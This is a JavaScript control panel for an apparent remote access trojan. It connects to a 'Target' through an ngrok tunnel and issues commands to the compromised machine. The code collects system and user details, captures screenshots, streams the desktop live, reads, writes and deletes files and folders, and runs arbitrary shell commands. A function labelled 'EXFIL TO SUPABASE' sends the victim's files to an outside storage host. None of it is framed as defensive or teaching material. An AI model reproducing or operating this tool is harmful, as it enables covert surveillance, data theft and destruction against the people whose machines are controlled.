let BASE = "";

// ----- CONNECT SCREEN -----
function setAddress(addr) {
	document.getElementById("server-address").value = addr;
}

async function connect() {
	const addr = document.getElementById("server-address").value.trim();
	if (!addr) {
		document.getElementById("connect-error").textContent =
			"enter a server address";
		return;
	}

	// Strip trailing slash
	BASE = addr.replace(/\/+$/, "");

	// Test connection
	try {
		const res = await fetch(BASE + "/", {
			headers: { "ngrok-skip-browser-warning": "true" },
		});
		let text = await res.text();
		text = text.replaceAll('"', "");
		if (text !== "Target Connected") {
			document.getElementById("connect-error").textContent =
				"unexpected response: " + text;
			return;
		} else {
			await getSysInfo();
		}
	} catch (e) {
		document.getElementById("connect-error").textContent =
			"connection failed: " + e.message;
		return;
	}

	// Switch to main screen
	document.getElementById("connect-screen").style.display = "none";
	document.getElementById("main-screen").style.display = "block";
	document.getElementById("status-target").textContent = BASE;
}

function disconnect() {
	BASE = "";
	document.getElementById("main-screen").style.display = "none";
	document.getElementById("connect-screen").style.display = "flex";
	document.getElementById("connect-error").textContent = "";
}

// ----- UTILITY -----
async function api(url) {
	const res = await fetch(url, {
		headers: {
			"ngrok-skip-browser-warning": "true",
		},
	});
	if (!res.ok) throw new Error(`HTTP ${res.status}`);
	return res;
}

function show(el, content, ok = true) {
	const div = document.getElementById(el);
	div.textContent = content;
	div.className = "output " + (ok ? "success" : "error");
}
// ----- SYSTEM INFO -----
async function getSysInfo() {
	try {
		const res = await api(`${BASE}/sysinfo`);
		const data = await res.json();

		if (data.error) {
			show("sysinfo-output", "error: " + data.error, false);
			return;
		}

		const lines = [
			`hostname:   ${data.hostname}`,
			`os:         ${data.os} ${data.os_release} (${data.architecture})`,
			`user:       ${data.username}`,
			`ip:         ${data.ip}`,
			`cpu:        ${data.processor}`,
			`cores:      ${data.cpu_physical} physical / ${data.cpu_count} logical`,
			`cpu usage:  ${data.cpu_percent}%`,
			`ram:        ${data.ram_total_gb}GB total / ${data.ram_available_gb}GB free (${data.ram_percent}% used)`,
			`disk (c:\): ${data.disk_total_gb}GB total / ${data.disk_free_gb}GB free (${data.disk_percent}% used)`,
			`boot time:  ${new Date(data.boot_time * 1000).toLocaleString()}`,
		];

		show("sysinfo-output", lines.join("\n"), true);
	} catch (e) {
		show("sysinfo-output", e.message, false);
	}
}

// ----- SCREENSHOT -----
async function takeScreenshot() {
	const out = document.getElementById("screenshot-output");
	try {
		const res = await api(`${BASE}/screenshot`);
		const blob = await res.blob();
		const url = URL.createObjectURL(blob);
		out.innerHTML = `<img src="${url}" alt="screenshot" />`;
	} catch (e) {
		out.innerHTML = `<div class="output error">${e.message}</div>`;
	}
}

// ----- DIRECTORY LISTING -----
async function listDir() {
	const path = document.getElementById("dir-path").value || "";
	try {
		const res = await api(
			`${BASE}/getdir${path !== "" ? "?path=" + encodeURIComponent(path) : ""}`,
		);
		const data = await res.json();
		show("dir-output", Array.isArray(data) ? data.join("\n") : data, true);
	} catch (e) {
		show("dir-output", e.message, false);
	}
}

// ----- READ FILE -----
async function readFile() {
	const path = document.getElementById("read-path").value;
	try {
		const res = await api(`${BASE}/readfile?path=${encodeURIComponent(path)}`);
		const text = await res.text();
		const formatted = text
			.replace(/&/g, "&amp;")
			.replace(/</g, "&lt;")
			.replace(/>/g, "&gt;")
			.replace(/\r\n/g, "\n")
			.replace(/\n/g, "<br>")
			.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;");
		const div = document.getElementById("read-output");
		div.innerHTML = formatted;
		div.className = "output success";
	} catch (e) {
		show("read-output", e.message, false);
	}
}

// ----- CREATE FILE -----
async function createFile() {
	const path = document.getElementById("create-path").value;
	const content = document.getElementById("create-content").value;
	try {
		const res = await api(
			`${BASE}/createfile?path=${encodeURIComponent(path)}&content=${encodeURIComponent(content)}`,
		);
		const text = await res.text();
		show("create-output", "created / written: " + text, true);
	} catch (e) {
		show("create-output", e.message, false);
	}
}

// ----- DELETE FILE -----
async function deleteFile() {
	const path = document.getElementById("delete-path").value;
	try {
		const res = await api(
			`${BASE}/removefile?path=${encodeURIComponent(path)}`,
		);
		const text = await res.text();
		show("delete-output", text, true);
	} catch (e) {
		show("delete-output", e.message, false);
	}
}

// ----- DELETE FOLDER -----
async function deleteFolder() {
	const path = document.getElementById("delete-path").value;
	try {
		const res = await api(
			`${BASE}/removefolder?path=${encodeURIComponent(path)}`,
		);
		const text = await res.text();
		show("delete-output", text, true);
	} catch (e) {
		show("delete-output", e.message, false);
	}
}

// ----- DOWNLOAD (EXFIL TO SUPABASE) -----
async function downloadFile() {
	const path = document.getElementById("download-path").value;
	try {
		const res = await api(
			`${BASE}/downloadfile?path=${encodeURIComponent(path)}`,
		);
		let text = await res.text();
		const url = text.replaceAll('"', "");
		if (url.startsWith("http")) {
			const a = document.createElement("a");
			a.href = url;
			a.target = "_blank";
			a.click();
		} else {
			show("download-output", url, false);
		}
	} catch (e) {
		show("download-output", e.message, false);
	}
}

// ----- UPLOAD (FETCH FROM SUPABASE) -----
async function uploadFile() {
	const dwpath = document.getElementById("upload-path").value;
	const dbfilename = document.getElementById("upload-filename").value;
	try {
		const res = await api(
			`${BASE}/uploadfile?dwpath=${encodeURIComponent(dwpath)}&dbfilename=${encodeURIComponent(dbfilename)}`,
		);
		const text = await res.text();
		show("upload-output", text, true);
	} catch (e) {
		show("upload-output", e.message, false);
	}
}
let pc = null;
// ----- STREAM DESKTOP -----
async function startStream() {
	pc = new RTCPeerConnection();

	pc.ontrack = (event) => {
		document.getElementById("video-stream").srcObject = event.streams[0];
	};

	pc.addTransceiver("video", {
		direction: "recvonly",
	});
	const offer = await pc.createOffer();
	await pc.setLocalDescription(offer);

	const response = await fetch(`${BASE}/offer`, {
		method: "POST",
		headers: {
			"Content-Type": "application/json",
		},
		body: JSON.stringify(pc.localDescription),
	});

	const answer = await response.json();

	document.getElementById("stream-start-btn").style.display = "none";
	document.getElementById("stream-stop-btn").style.display = "inline-block";

	await pc.setRemoteDescription(answer);
}

async function stopStream() {
	if (pc) {
		pc.close();
		document.getElementById("stream-start-btn").style.display = "inline-block";
		document.getElementById("stream-stop-btn").style.display = "none";
		document.getElementById("video-stream").style.max_width = "0%";
	}
}

// ----- CMD -----
async function runCmd() {
	const cmd = document.getElementById("cmd-cmd").value;
	const path = document.getElementById("cmd-path").value;
	try {
		const res = await api(
			`${BASE}/cmd?cmd=${encodeURIComponent(cmd)}&path=${encodeURIComponent(path)}`,
		);
		const data = await res.json();
		let out = "";
		if (data.stdout) out += data.stdout;
		if (data.stderr) out += "\n[stderr]\n" + data.stderr;
		out += `\n[exit code: ${data.code}]`;
		show("cmd-output", out, data.code === 0);
	} catch (e) {
		show("cmd-output", e.message, false);
	}
}
